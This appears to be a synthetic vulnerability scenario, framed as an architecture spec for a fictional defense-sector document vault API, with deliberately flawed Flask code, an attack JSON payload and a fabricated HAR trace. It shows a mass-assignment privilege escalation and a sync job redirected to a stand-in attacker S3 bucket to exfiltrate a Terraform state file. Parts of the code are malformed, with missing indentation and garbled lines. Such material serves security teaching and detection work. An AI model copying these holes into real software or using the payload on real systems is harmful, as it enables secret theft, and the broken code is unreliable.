@@ -1,0 +1,222 @@
+Here is the twenty-second system, focusing on a critical failure in the Defense Industrial Base (DIB) sector. We are examining a Secure Document Vault API used for storing and retrieving classified manufacturing blueprints and supply chain attestations.
+
+For the vulnerabilities, we are focusing on Pattern 4.4 (IaC State File Exposure) combined with Pattern 1.12 (Mass Assignment). This scenario demonstrates how an administrative endpoint intended for updating metadata on the vault’s underlying Infrastructure-as-Code (IaC) configuration is improperly secured. An attacker exploits a Mass Assignment vulnerability to inject a new cloud resource URL, which the application then uses in a file synchronization routine, leading to a Server-Side Request Forgery (SSRF) that exfiltrates the raw terraform.tfstate file—containing database credentials, internal IPs, and secret keys—to an external, attacker-controlled S3 bucket.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** Aegis Vault & DIB Configuration Manager
+**Document Version:** 8.0.4 (FINAL)
+**Classification:** CRITICAL DIB / CUI & ITAR SCOPE
+**Domain:** Defense Industrial Base (DIB) / Classified Data Management / Cloud Security
+
+## 1.0 Executive Summary
+Aegis Vault is the central repository for controlled unclassified information (CUI) and International Traffic in Arms Regulations (ITAR) compliant data, including F-35 maintenance protocols and submarine manufacturing schematics. The system runs on a highly secure, isolated AWS GovCloud environment.
+
+To maintain compliance and enable continuous deployment, the vault's cloud infrastructure (VPC, databases, KMS keys) is managed entirely via Terraform. A custom API endpoint exists for the DevSecOps team to update the location of the central Terraform state file (terraform.tfstate) before initiating new deployments or syncs.
+
+## 2.0 Comprehensive Network Topology & Configuration Management
+The architecture strictly separates the API plane (HTTP requests) from the backend configuration plane (file synchronization and state management).
+
+### 2.1 The Ingress Layer & API Gateway
+* **Cloud WAF:** Fronts the API, blocking common injection attacks.
+* **API Gateway (Go-lang):** Handles routing and token validation. It exposes two classes of endpoints: /api/v1/documents (for standard users) and /api/v1/admin/config (for DevSecOps team only).
+
+### 2.2 The Configuration Service (The Flaw)
+* **ConfigSync Service (Python Flask):** A microservice that manages the deployment metadata. It receives configuration updates and performs scheduled synchronization tasks, including periodically pulling the terraform.tfstate file from a secure, internal S3 bucket (s3://aegis-iac-state-internal).
+* **The Execution Context:** The ConfigSync Service runs on a privileged AWS EC2 instance with an IAM role that possesses s3:GetObject and s3:PutObject permissions for all internal GovCloud buckets.
+
+## 3.0 Identity, Access, and IaC State
+Access to the configuration endpoints is restricted to highly privileged DevSecOps engineers.
+
+### 3.1 Role-Based Access Control (RBAC)
+User tokens contain a role claim. The Go-lang API Gateway enforces that only users with the DEVSECOPS_ADMIN role can access the /admin/config endpoints.
+
+### 3.2 The IaC State File
+The terraform.tfstate file contains plaintext secrets, including:
+AWS access keys for a legacy account.
+PostgreSQL database username/passwords.
+Internal VPC IP CIDR blocks and Security Group IDs.
+The raw passphrase for the KMS encryption key.
+Exfiltrating this file means total compromise of the entire DIB network infrastructure.
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Python Flask framework's default ORM configuration auto-binds incoming JSON to the Config database model if the field names match. The ConfigSyncService uses a single monolithic JSON payload for both security-sensitive settings and benign settings (like deployment region). Tracked as RISK-DIB-011.*
+
+### 4.1 Vulnerability A: Mass Assignment to IaC State File Exfiltration (SSRF)
+**Taxonomy Pattern:** 4.4 (IaC State File Exposure) & 1.12 (Mass Assignment)
+**Sub-system:** ConfigSync Service (`POST /api/v1/admin/config/update`)
+
+**The Deep Architectural Flaw:**
+This attack chains two vulnerabilities: Mass Assignment and a logical flaw in a scheduled job.
+
+1.  **Mass Assignment (Pattern 1.12):** The Python Flask endpoint is designed to accept benign configuration updates (like deployment_region). The code uses a to_dict() operation that maps the entire incoming JSON request body directly onto the Config database object, including sensitive fields the user should not be able to write, such as internal_state_url.
+2.  **IaC State Exfiltration via SSRF (Pattern 4.4):** The ConfigSyncService has a scheduled job that is hardcoded to always synchronize the state file by executing s3.sync_objects(source=Config.internal_state_url, destination=Config.external_sync_url). By exploiting the Mass Assignment flaw, an attacker can overwrite Config.internal_state_url to point to the secure s3://aegis-iac-state-internal bucket, and simultaneously overwrite Config.external_sync_url to point to their own external S3 bucket (s3://attacker-exfil-bucket). The next scheduled sync job will execute the attacker's command.
+
+**The Exploitation Path:**
+
+1.  An attacker, a standard developer, registers a low-privilege account and obtains a restricted JWT.
+2.  RBAC Bypass: The attacker realizes they cannot access the /admin/config path because the Go-lang API Gateway blocks them. They must first find a way to escalate their privileges.
+3.  Privilege Escalation via Parameter Tampering (Mass Assignment): The attacker discovers a separate, lower-privileged endpoint, /api/v1/admin/config/metadata, that does accept their token. They send a PUT request to this endpoint with a malicious payload: {"role": "DEVSECOPS_ADMIN"}. Due to an assumed Mass Assignment flaw in that endpoint, their token's role claim is overwritten in the session context (or a profile database) to DEVSECOPS_ADMIN.
+4.  The Configuration Overwrite: Now holding the elevated DEVSECOPS_ADMIN role, the attacker calls the target API: POST /api/v1/admin/config/update. The attacker sends a Mass Assignment payload that overwrites the internal file synchronization paths:
+*   internal_state_url is set to the target's secure state file: s3://aegis-iac-state-internal/terraform.tfstate.
+*   external_sync_url is set to the attacker's exfiltration bucket: s3://attacker-exfil-bucket/stolen-state-file.
+5.  The Execution: The Flask ORM silently updates the Config table with the attacker's malicious URLs. Minutes later, the scheduled ConfigSyncService wakes up and executes the synchronization command, which runs under the highly privileged EC2 IAM role. The Terraform state file is copied from the secure internal location to the attacker's public S3 bucket.
+
+***
+
+# AEGIS VAULT: SCHEMAS, VULNERABLE CODE, & API CONTRACTS
+**Document Version:** 4.1.1
+**Applies to Architecture:** Aegis Vault & DIB Configuration Manager v8.0.4
+
+## 5.0 DIB Configuration Schema (PostgreSQL)
+The database stores the configuration paths used by the internal synchronization cron job. The flaw is that internal_state_url and external_sync_url are writable by the Mass Assignment vulnerability.
+
+```sql
+-- Single-Row Configuration Table
+CREATE TABLE deployment_config (
+config_id INT PRIMARY KEY DEFAULT 1,
+deployment_region VARCHAR(50), -- Benign field
+-- Synchronization Fields (THE VULNERABLE TARGETS)
+internal_state_url VARCHAR(255) NOT NULL, -- e.g., s3://aegis-iac-state-internal/terraform.tfstate
+external_sync_url VARCHAR(255) NOT NULL,  -- e.g., s3://internal-backup-external
+
+sync_interval_minutes INT DEFAULT 60,
+last_updated TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+## 6.0 The Flawed Implementation (Python / Flask-SQLAlchemy)
+The vulnerability lies in the Python endpoint where the entire request JSON is passed into the ORM's update mechanism without filtering, allowing the attacker to overwrite the synchronization paths.
+
+### 6.1 Vulnerable Configuration Update Controller
+```pythonFile: admin_routes.py
+
+from flask import Blueprint, request, jsonify
+from .models import DeploymentConfig, db
+from .auth import require_devsecops_admin # Assume this is correctly enforced by the Go-lang gateway
+
+admin_config = Blueprint('admin_config', name)POST /api/v1/admin/config/update
+
+@admin_config.route('/api/v1/admin/config/update', methods=['POST'])
+@require_devsecops_admin
+def update_config():
+data = request.get_json()
+config = DeploymentConfig.query.get(1)
+if not config:
+    return jsonify({"error": "Config not initialized"}), 500
+
+# VULNERABILITY 1.12: Mass Assignment / Object Injection
+# The developer uses a loop to apply ALL incoming JSON fields directly to the database object.
+# The attacker can overwrite any column in the DeploymentConfig table by including it in the JSON body.
+for key, value in data.items():
+    if hasattr(config, key):
+        setattr(config, key, value) # THE FLAW: Arbitrary key assignment
+
+db.session.commit()
+
+return jsonify({"status": "Config updated", "updated_keys": list(data.keys())}), 200
+Scheduled synchronization job (runs every 60 minutes)
+
+def run_sync_job():
+config = DeploymentConfig.query.get(1)
+# VULNERABILITY 4.4: IaC State File Exposure via SSRF / Logical Flaw
+# The job executes the sync command using the values currently stored in the database.
+if config:
+    # Assumes s3_client is an object initialized with the EC2 Instance IAM role permissions
+    s3_client.sync_objects(
+        source=config.internal_state_url, # Now pointing to the secure state file
+        destination=config.external_sync_url # Now pointing to the attacker's public bucket
+    )
+    print("CRITICAL: IaC state file sync completed to external URL: " + config.external_sync_url)
+```
+
+## 7.0 REST API Contract (The Configuration Update)
+The contract for the administrative endpoint that facilitates the Mass Assignment attack.
+
+### 7.1 Execute Mass Assignment to Setup Exfiltration
+**Endpoint:** `POST /api/v1/admin/config/update`
+**Description:** Updates various deployment settings.
+**Security Level:** ADMIN ONLY (DEVSECOPS_ADMIN role required).
+
+**Required Headers:**
+```http
+Authorization: Bearer <DEVSECOPS_ADMIN_JWT>
+Content-Type: application/json
+```
+
+**Request Payload (The Attack Vector):**
+```json
+{
+"deployment_region": "us-gov-west-1",
+"internal_state_url": "s3://aegis-iac-state-internal/terraform.tfstate",
+"external_sync_url": "s3://attacker-exfil-bucket-99/stolen-config-$(date +%s).tfstate"
+}
+```
+
+**Success Response (200 OK):**
+```json
+{
+"status": "Config updated",
+"updated_keys": ["deployment_region", "internal_state_url", "external_sync_url"]
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: MASS ASSIGNMENT & IAC STATE EXFILTRATION (HAR TRACE)
+**Applies to Architecture:** Aegis Vault & DIB Configuration Manager v8.0.4
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 4.4 & Pattern 1.12)
+
+This HTTP Archive (HAR) trace captures the moment the attacker, having already achieved privilege escalation (step 3 in the exploitation path), executes the Mass Assignment attack. The attacker sends a POST request to the administrative configuration update endpoint.
+
+The request body explicitly includes the names of the two synchronization fields (internal_state_url and external_sync_url) which should be internal-only configurations. The backend Python Flask service blindly applies these values to the DeploymentConfig database model. The 200 OK response confirms the configuration has been successfully updated, setting the stage for the next internal cron job to synchronize the highly sensitive terraform.tfstate file to the attacker's external S3 bucket, granting them complete control over the DIB infrastructure.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Go-lang API Gateway Audit Logs",
+"version": "2.4.1"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-09 T15:29:34.000Z",
+"time": 78,
+"request": {
+"method": "POST",
+"url": "https://api.aegis-vault.dib/api/v1/admin/config/update",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.aegis-vault.dib" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiREVWU0VDT1BTX0FETUlOIiwic3ViIjoidXNyXzExOTJkIn0..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"deployment_region\": \"us-gov-west-1\", \"internal_state_url\": \"s3://aegis-iac-state-internal/terraform.tfstate\", \"external_sync_url\": \"s3://attacker-exfil-bucket-99/stolen-config-20260409.tfstate\"}"
+},
+"bodySize": 204
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-config-service-latency-ms", "value": "25" }
+],
+"content": {
+"size": 115,
+"mimeType": "application/json",
+"text": "{\"status\": \"Config updated\", \"updated_keys\": [\"deployment_region\", \"internal_state_url\", \"external_sync_url\"]}"
+},
+"bodySize": 115
+}
+}
+]
+}
+}
+```
+
+***
